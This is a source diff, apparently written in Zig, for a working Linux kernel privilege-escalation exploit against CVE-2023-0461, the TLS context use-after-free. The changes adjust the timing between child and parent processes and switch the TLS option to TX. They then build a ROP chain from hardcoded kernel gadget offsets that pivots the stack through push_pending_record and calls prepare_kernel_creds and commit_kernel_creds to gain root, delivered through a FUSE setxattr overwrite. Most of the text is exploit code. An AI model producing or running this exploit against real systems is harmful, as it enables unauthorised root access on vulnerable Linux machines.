@@ -127,6 +127,7 @@ const TLSContext = extern struct {
 
 comptime {
     assert(@sizeOf(TLSContext) == 328);
+    assert(@offsetOf(TLSContext, "flags1") == 0x90);
 }
 
 // Zig std library doesn't consider possiblity of setting iov_base to null
@@ -356,9 +357,14 @@ fn cve_2023_0461() !void {
         const client_sk_conn = try os.accept(target_sk, null, null, 0);
         defer os.closeSocket(client_sk_conn);
 
+        log.info("child: set TX sk_proto on sendmsg sk", .{});
+        try setTLSOpt(client_sk_conn, .TX);
+
+        try psync.cont(2);
+
         const client_sk1 = try os.socket(os.AF.INET, os.SOCK.STREAM, 0);
         defer os.closeSocket(client_sk1);
-        log.info("client: connect for free context sk", .{});
+        log.info("child: connect for free context sk", .{});
         try retry_connect(client_sk1, target_addr_p, addr_sz);
 
         try psync.cont(3);
@@ -425,7 +431,7 @@ fn cve_2023_0461() !void {
         os.nanosleep(1, 0);
 
         log.info("child: try overwrite xattr", .{});
-        setTLSOpt(target_sk, .RX) catch |e| {
+        setTLSOpt(target_sk, .TX) catch |e| {
             log.err("child: setTLSOpt failed: {}", .{e});
         };
 
@@ -517,6 +523,8 @@ fn cve_2023_0461() !void {
     defer os.closeSocket(client_sk2);
     try retry_connect(client_sk2, target_addr_p, addr_sz);
 
+    try psync.wait(2);
+
     // Best to free the ctx and allocate the xattr on the same CPU
     log.info("parent: accept and use sk to free context", .{});
     const client_sk_close = try os.accept(target_sk, null, null, 0);
@@ -546,10 +554,72 @@ fn cve_2023_0461() !void {
 
     log.info("parent: kernel .text = {x}", .{kernel_text});
 
+    const prepare_kernel_creds_offset = kernel_text + 0xcc7b0;
+    const commit_kernel_creds_offset = kernel_text + 0xcc3f0;
+
+    // Regs at push_pending_record
+    // - `rax = ctx`
+    // - `rbx = rsp + 0x8f`
+    // - `rcx = 0x18 = 16 + 8` maybe `cmsg_len`
+    // - `rdx = 0x18`
+    // - `rdi = sk`
+    // - `rsi = 0`
+    // - `r8 = 0`
+    // - `r9 = rsp + ??`
+    // - `r10 = 0`
+    // - `r11 = rip` used by indirect thunk array
+    // - `r12 = rsp + ??`
+    // - `r13 = 0`
+    // - `r14 = rsp + ??`
+    // - `r15 = sk`
+    // - `rbp = 0`
+
+    // mov rsp, rax; ret
+    const mov_rsp_rax_ret = kernel_text + 0x000000000001755e;
+    // add rsp, 0x90 ; ret
+    const add_rsp_0x90_ret = kernel_text + 0x000000000071b0a3;
+    //  add rsp, 0x30 ; ret
+    const add_rsp_0x30 = kernel_text + 0x00000000001ed56f;
+    // mov rdi, r8 ; mov rax, rdi ; ret
+    const mov_rdi_r8_mov_rax_rdi_ret = kernel_text + 0x000000000075030d;
+    const mov_rax_rbx_pop_rbx_ret = kernel_text + 0x000000000004444b;
+    const push_rax_pop_rbx_ret = kernel_text + 0x00000000000f0499;
+    const pop_rsi_ret = kernel_text + 0x0000000000000825;
+    const sub_rax_ret = kernel_text + 0x000000000014903c;
+
+    const rop_creds = [_]u64{
+        // call prepare_kernel_creds(NULL)
+        // r8 = 0x0
+        mov_rdi_r8_mov_rax_rdi_ret,
+        prepare_kernel_creds_offset,
+        // call commit_kernel_creds(prepare_kernel_creds(NULL))
+        // prepare creds exits with rdi = rax :-)
+        commit_kernel_creds_offset,
+        // the rest restores rsp using the callee saved reg rbx
+        // move rbx into rax then restore rbx
+        mov_rax_rbx_pop_rbx_ret,
+        0xadd1337c0de,
+        push_rax_pop_rbx_ret,
+        // rax -= (rsi = 0x8f)
+        pop_rsi_ret,
+        0x8f,
+        sub_rax_ret,
+        // restore the original stack
+        mov_rsp_rax_ret,
+    };
+    const rop_bytes = mem.asBytes(&rop_creds);
+
     ctx.pending_open_record_frags = 0xff;
-    ctx.push_pending_record = kernel_text + 0x48751;
+    ctx.push_pending_record = mov_rsp_rax_ret;
     @memcpy(ctx_xattr[0..@sizeOf(TLSContext)], mem.asBytes(&ctx));
-    @memcpy(ctx_xattr[0..8], mem.asBytes(&(kernel_text + 0x71b0a3)));
+
+    var rsp: u64 = 0;
+    @memcpy(ctx_xattr[rsp..8], mem.asBytes(&add_rsp_0x90_ret));
+    rsp += 8; // ret in stack_pivot_to_ctx pops the stack
+    rsp += 0x90;
+    @memcpy(ctx_xattr[rsp..][0..8], mem.asBytes(&add_rsp_0x30));
+    rsp += 8 + 0x30;
+    @memcpy(ctx_xattr[rsp..][0..rop_bytes.len], rop_bytes);
 
     {
         const res = Fuse.setxattr(@ptrCast(xattr_path), name, &ctx_xattr, ctx_xattr.len, 0);
